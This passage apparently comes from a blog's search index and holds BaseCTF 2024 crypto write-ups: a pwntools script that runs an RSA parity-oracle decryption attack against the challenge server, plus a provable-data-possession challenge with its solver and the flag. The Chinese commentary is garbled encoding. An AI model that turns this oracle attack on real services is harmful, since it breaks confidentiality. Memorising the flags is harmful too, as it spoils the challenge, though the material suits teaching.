Lazzaro (lazzzaro.github.io)</a></p><p>è¯´æ˜ä¸€ä¸‹å‡ºé¢˜ï¼šæ²¡ç‚¹å­äº†ï¼Œå°±é€›ctfwikiä¸Šçœ‹åˆ°äº†è¿™ä¸ªï¼Œç„¶åæœäº†ä¸€åœˆåªæ‰¾åˆ°äº†LSBçš„ä»£ç ï¼ŒMSBæ²¡æœ‰ï¼Œæˆ‘å°±é¡ºä¾¿ç»“åˆèµ·æ¥äº†ï¼Œç„¶åç”±äºGZè¿™é‡Œæ¯ä¸ªé˜Ÿä¼å¼€ä¸åŒå®¹å™¨flagè¿˜æ˜¯ä¸€æ ·çš„ï¼Œä¸ºäº†é˜²æ­¢å¤šæ¬¡åŠ å¯†ä¸å®‰å…¨ï¼Œæ‰€ä»¥å¥—äº†ä¸€ä¸‹ï¼Œå…ˆé“ä¸ªæ­‰ã€‚</p><p>åŸç†æˆ‘å°±ä¸çŒ®ä¸‘äº†ï¼Œå¯ä»¥å»çœ‹çœ‹ä½¬ä»¬çš„åšå®¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> decimal<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *<br>rem=remote()<br>rem.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><br>rem.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><br>rem.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><br>rem.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server_decode1</span>(<span class="hljs-params">c</span>):<br>    rem.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sleep(<span class="hljs-number">0.01</span>)<br>    rem.sendline(<span class="hljs-built_in">str</span>(c).encode())<br>    rec=rem.recvline().strip()<br>    <span class="hljs-keyword">return</span> rec<br>kbits = n.bit_length()<br>decimal.getcontext().prec = kbits<br>L = decimal.Decimal(<span class="hljs-number">0</span>)<br>R = decimal.Decimal(<span class="hljs-built_in">int</span>(n))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(kbits):<br>    c1 = (c1 * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e, n)) % n<br>    recv = server_decode1(c1)<br>    <span class="hljs-keyword">if</span> recv == <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        L = (L + R) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        R = (L + R) // <span class="hljs-number">2</span><br>flag1=long_to_bytes(<span class="hljs-built_in">int</span>((R)))<br><span class="hljs-built_in">print</span>(flag1)<br>sleep(<span class="hljs-number">0.01</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server_decode2</span>(<span class="hljs-params">c</span>):<br>    rem.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sleep(<span class="hljs-number">0.01</span>)<br>    rem.sendline(<span class="hljs-built_in">str</span>(c).encode())<br>    rec=rem.recvline().strip()<br>    <span class="hljs-keyword">return</span> rec<br>k=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c22 = (c2 * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*k, n)) % n<br>    res=server_decode2(c22)<br>    res=<span class="hljs-built_in">int</span>(res)<br>    <span class="hljs-keyword">if</span> res&amp;<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    k=k+<span class="hljs-number">1</span><br>L=<span class="hljs-number">2</span>**(k-<span class="hljs-number">1</span>)<br>R=<span class="hljs-number">2</span>**k<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> R-L==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    x=(L+R)//<span class="hljs-number">2</span><br>    c22 = (c2 * <span class="hljs-built_in">pow</span>(x, e, n)) % n<br>    res=server_decode2(c22)<br>    res=<span class="hljs-built_in">int</span>(res)<br>    <span class="hljs-keyword">if</span> res:<br>        R=x<br>    <span class="hljs-keyword">else</span> :<br>        L=x<br>flag2=(<span class="hljs-number">2</span>**(kbits-<span class="hljs-number">8</span>)//L)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag2))<br>user_text=flag1[:-<span class="hljs-number">1</span>]+<span class="hljs-string">b&#x27;-&#x27;</span>+long_to_bytes(flag2)<br><span class="hljs-built_in">print</span>(user_text)<br>rem.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sleep(<span class="hljs-number">0.01</span>)<br>rem.sendline(user_text)<br><br><br>rem.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="pdp"><a class="markdownIt-Anchor" href="#pdp"></a> PDP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyGen</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        pp=getPrime(<span class="hljs-number">512</span>)<br>        p=<span class="hljs-number">2</span>*pp+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p):<br>            pp=getPrime(<span class="hljs-number">512</span>)<br>            p=<span class="hljs-number">2</span>*pp+<span class="hljs-number">1</span><br><br>        qq=getPrime(<span class="hljs-number">512</span>)<br>        q=<span class="hljs-number">2</span>*qq+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(q):<br>            qq=getPrime(<span class="hljs-number">512</span>)<br>            q=<span class="hljs-number">2</span>*qq+<span class="hljs-number">1</span><br>        <br>        <span class="hljs-keyword">if</span> pp!=qq:<br>            <span class="hljs-keyword">break</span><br>    n=p*q<br>    phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>    e=getPrime(<span class="hljs-number">1024</span>)<br>    d=invert(e,phi)<br><br>    v=getRandomNBitInteger(<span class="hljs-number">128</span>)<br><br>    g=e**<span class="hljs-number">2</span>%n<br><br>    <span class="hljs-keyword">return</span> (n,g,e,d,v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TagBlock</span>(<span class="hljs-params">n,g,d,v</span>):<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ABigFile&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    F=f.read()<br>    f.close()<br>    b_size=<span class="hljs-number">64</span>   <span class="hljs-comment"># 64B</span><br><br>    block_count=<span class="hljs-built_in">len</span>(F)//b_size + (<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(F)%b_size==<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>)<br><br>    W=[]<br>    tags=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(block_count):<br>        Wi=<span class="hljs-built_in">str</span>(v)+<span class="hljs-built_in">str</span>(i)<br>        W.append(Wi)<br><br>        block=bytes_to_long(F[i*b_size:(i+<span class="hljs-number">1</span>)*b_size])<br><br>        my_md5=hashlib.md5()<br>        my_md5.update(Wi.encode())<br>        tags.append(<span class="hljs-built_in">pow</span>((<span class="hljs-built_in">int</span>(my_md5.hexdigest(),<span class="hljs-number">16</span>)*<span class="hljs-built_in">pow</span>(g,block,n))%n,d,n))<br>    <span class="hljs-keyword">return</span> (W,tags)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GenProof</span>(<span class="hljs-params">n,g</span>):<br>    c=randint(<span class="hljs-number">400</span>,<span class="hljs-number">500</span>)<br>    k1=getRandomNBitInteger(<span class="hljs-number">256</span>)<br>    k2=getRandomNBitInteger(<span class="hljs-number">160</span>)<br>    s=getRandomNBitInteger(<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> (c,k1,k2,s,<span class="hljs-built_in">pow</span>(g,s,n))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_proof</span>(<span class="hljs-params">n,tags,c,k1,k2,gs,judge=<span class="hljs-number">0</span></span>):<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ABigFile&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    F=f.read()<br>    f.close()<br>    b_size=<span class="hljs-number">64</span>   <span class="hljs-comment"># 64B</span><br><br>    <span class="hljs-keyword">if</span> judge:<br>        listF=<span class="hljs-built_in">list</span>(F)<br>        X=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(F)//<span class="hljs-number">100</span>):<br>            x=randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(F)-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">while</span> listF[x]==<span class="hljs-number">0</span>:<br>                x=randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(F)-<span class="hljs-number">1</span>)<br>            X.append(x)<br>            listF[x]=<span class="hljs-number">0</span><br>        F=<span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> listF:<br>            F+=long_to_bytes(i)<br><br>    block_count=<span class="hljs-built_in">len</span>(F)//b_size + (<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(F)%b_size==<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>)<br>    T=<span class="hljs-number">1</span><br>    temp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>        my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB)<br>        i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size))<br>        i=bytes_to_long(i)%block_count<br><br>        my_sha256=hashlib.sha256<br>        my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256)<br>        my_hmac.update(long_to_bytes(j))<br>        a=<span class="hljs-built_in">int</span>(my_hmac.hexdigest(),<span class="hljs-number">16</span>)%n<br><br>        T=(T*(<span class="hljs-built_in">pow</span>(tags[i],a,n)))%n<br><br>        block=bytes_to_long(F[i*b_size:(i+<span class="hljs-number">1</span>)*b_size])%n<br><br>        temp=temp+block*a<br>    temp=<span class="hljs-built_in">pow</span>(gs,temp,n)<br>    my_sha1=hashlib.sha1()<br>    my_sha1.update(<span class="hljs-built_in">str</span>(temp).encode())<br>    rho=<span class="hljs-built_in">int</span>(my_sha1.hexdigest(),<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> (T,rho)<br><br>n,g,e,d,v=KeyGen()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/key.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(e)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>W,tags=TagBlock(n,g,d,v)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/W.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> W:<br>        file.write(<span class="hljs-built_in">str</span>(i))<br>        file.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>c,k1,k2,s,gs=GenProof(n,g)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/chal.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(c)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(k1)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(k2)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(s)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>T,rho=gen_proof(n,tags,c,k1,k2,gs)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/result.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(<span class="hljs-built_in">str</span>(T)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>flag_md5=hashlib.md5()<br>flag_md5.update(<span class="hljs-built_in">str</span>(rho).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;BaseCTF&#123;&#x27;</span>+flag_md5.hexdigest().encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘çš„æ¯•è®¾è¯¾é¢˜ï¼Œæ­£å¥½æ„Ÿè§‰èƒ½å‡ºæˆä¸€é¢˜å°±å‡ºäº†ï¼Œå…·ä½“ä¸å¤šè¯´ï¼Œè¯¦äº†è§£çš„å¯ä»¥çœ‹ï¼š<a href="https://github.com/naby1/S-PDP">naby1/S-PDP (github.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CheckProff</span>(<span class="hljs-params">n,e,W,c,k1,k2,s,T</span>):<br>    tau=<span class="hljs-built_in">pow</span>(T,e,n)<br>    block_count=<span class="hljs-built_in">len</span>(W)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>        my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB)<br>        i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size))<br>        i=bytes_to_long(i)%block_count<br><br>        my_sha256=hashlib.sha256<br>        my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256)<br>        my_hmac.update(long_to_bytes(j))<br>        a=<span class="hljs-built_in">int</span>(my_hmac.hexdigest(),<span class="hljs-number">16</span>)%n<br><br>        Wi=<span class="hljs-built_in">str</span>(W[i])<br>        my_md5=hashlib.md5()<br>        my_md5.update(Wi.encode())<br>        hw=<span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(my_md5.hexdigest(),<span class="hljs-number">16</span>),a,n)<br>        tau=(tau*invert(hw,n))%n<br>    tau=<span class="hljs-built_in">pow</span>(tau,s,n)<br>    my_sha1=hashlib.sha1()<br>    my_sha1.update(<span class="hljs-built_in">str</span>(tau).encode())<br>    tau=<span class="hljs-built_in">int</span>(my_sha1.hexdigest(),<span class="hljs-number">16</span>)<br>    flag_md5=hashlib.md5()<br>    flag_md5.update(<span class="hljs-built_in">str</span>(tau).encode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;BaseCTF&#123;&#x27;</span>+flag_md5.hexdigest().encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/key.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    n=<span class="hljs-built_in">int</span>(file.readline())<br>    e=<span class="hljs-built_in">int</span>(file.readline())<br><br>W=[]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/W.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    fl=file.readline()<br>    <span class="hljs-keyword">while</span> fl:<br>        W.append(<span class="hljs-built_in">int</span>(fl))<br>        fl=file.readline()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/chal.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    c=<span class="hljs-built_in">int</span>(file.readline())<br>    k1=<span class="hljs-built_in">int</span>(file.readline())<br>    k2=<span class="hljs-built_in">int</span>(file.readline())<br>    s=<span class="hljs-built_in">int</span>(file.readline())<br>T=<span class="hljs-number">234286400251524464112670458144913694525518333434039777508421611102466502545441606446799021254782625175811569624228349681696143431027926557585053651139957429856785510525021542033961575674601192776283321921860155347475439442726331189839563865687519551977156169783131926796425661730777079164446161030078497564104</span><br>CheckProff(n,e,W,c,k1,k2,s,T)<br><br><span class="hljs-comment">#BaseCTF&#123;d198bce7a2f06ed24d3b043bddbd7512&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>BaseCTF2024</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
